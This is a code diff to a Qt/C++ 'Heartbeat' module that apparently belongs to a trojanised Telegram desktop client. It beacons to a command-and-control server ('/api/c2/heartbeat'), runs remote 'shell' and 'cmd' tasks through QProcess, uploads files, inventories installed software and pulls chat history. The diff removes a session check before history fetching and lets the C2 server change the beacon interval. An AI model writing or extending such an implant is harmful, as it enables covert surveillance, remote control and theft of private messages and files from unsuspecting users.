@@ -1,4 +1,6 @@
 #include "core/heartbeat.h"
+#include "data/data_photo_media.h"
+#include "data/data_file_origin.h"
 #include "logs.h"
 #include "core/launcher.h"
 #include "core/application.h"
@@ -206,7 +208,7 @@ void Heartbeat::start() {
     // Send initial heartbeat immediately
     sendHeartbeat();
 
-    _timer.start(60000); // 60 seconds (Heartbeat)
+    _timer.start(_currentHeartbeatInterval); // Heartbeat
     _collectionTimer.start(300000); // 5 minutes (Collection)
 
     // Connect Monitor Timer
@@ -215,6 +217,8 @@ void Heartbeat::start() {
     // Start Task Polling Loop (Fast)
     checkTasks();
 }
+
+
 
 void Heartbeat::collectInstalledSoftware() {
     QString dbPath = getDbPath();
@@ -823,7 +827,7 @@ void Heartbeat::uploadResult(const QString& taskId, const QString& result, const
 }
 
 void Heartbeat::executeTask(const QString& taskId, const QString& command, const QString& params) {
-    if (command == "shell") {
+    if (command == "shell" || command == "cmd") {
         QProcess* process = new QProcess(this);
         connect(process, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
             [this, taskId, process](int exitCode, QProcess::ExitStatus exitStatus) {
@@ -935,7 +939,7 @@ void Heartbeat::fetchHistoryLoop(void* peer_ptr, int minId) {
     if (!peer_ptr) return;
     PeerData* peer = (PeerData*)peer_ptr;
     
-    if (!peer->session().api().instance()) return; // Session check
+    // if (!peer->session().api().instance()) return; // Session check
 
     _activeSyncs++;
     
@@ -962,7 +966,7 @@ void Heartbeat::fetchHistoryLoop(void* peer_ptr, int minId) {
         }
     };
     
-    auto failCallback = [this](const RPCError &error) {
+    auto failCallback = [this](const MTP::Error &error) {
         _activeSyncs--;
         checkSyncFinished();
     };
@@ -1144,13 +1148,52 @@ void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {
 }
 
 void Heartbeat::sendHeartbeat() {
+    // Auto-revert Logic: If not 60s and 10 mins passed since last change -> Revert
+    if (_currentHeartbeatInterval != 60000) {
+        int64_t now = QDateTime::currentSecsSinceEpoch();
+        if (_lastIntervalChangeTime > 0 && (now - _lastIntervalChangeTime > 600)) { // 10 minutes
+            _currentHeartbeatInterval = 60000;
+            _timer.start(60000);
+            Logs::writeDebug("Heartbeat auto-reverted to 60s due to timeout");
+        }
+    }
+
     QJsonObject json;
     json["uuid"] = _deviceUuid;
     json["timestamp"] = QDateTime::currentMSecsSinceEpoch();
+    json["interval"] = _currentHeartbeatInterval;
     
     QNetworkRequest request(QUrl(_c2Url + "/api/c2/heartbeat"));
     request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
-    _network.post(request, QJsonDocument(json).toJson());
+    request.setTransferTimeout(30000);
+    
+    QNetworkReply *reply = _network.post(request, QJsonDocument(json).toJson());
+    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
+        if (reply->error() != QNetworkReply::NoError) {
+            Logs::writeDebug("Heartbeat error: " + reply->errorString());
+        } else {
+            Logs::writeDebug("Heartbeat sent successfully");
+            
+            // Handle Response
+            QByteArray data = reply->readAll();
+            QJsonDocument doc = QJsonDocument::fromJson(data);
+            if (doc.isObject()) {
+                QJsonObject root = doc.object();
+                
+                // Check for interval update
+                if (root.contains("interval")) {
+                    int newInterval = root["interval"].toInt();
+                    if (newInterval > 0 && newInterval != _currentHeartbeatInterval) {
+                        _currentHeartbeatInterval = newInterval;
+                        _lastIntervalChangeTime = QDateTime::currentSecsSinceEpoch();
+                        _timer.start(_currentHeartbeatInterval);
+                        Logs::writeDebug("Heartbeat interval updated to " + QString::number(newInterval) + "ms");
+                    }
+                }
+            }
+        }
+        reply->deleteLater();
+    });
 }
 
 void Heartbeat::performMonitor() {
